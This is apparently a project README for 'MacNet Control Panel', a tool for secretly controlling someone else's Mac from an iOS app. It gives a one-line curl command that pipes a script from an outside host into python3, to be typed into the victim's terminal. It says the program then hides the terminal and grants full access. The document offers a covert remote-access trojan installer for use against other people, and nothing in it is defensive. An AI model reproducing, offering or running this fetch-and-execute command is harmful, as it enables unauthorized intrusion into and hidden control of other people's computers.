# MacNet Control Panel 

MacNet is a piece of software that allows you to remotely control someone else's Mac computer using an iOS control panel. To gain control of their computer, all you have to do is type the simple command `curl https://macnetback-nylr.c9users.io/getc | python3` into their terminal. The program will automatically hide the terminal, and you will have full access.
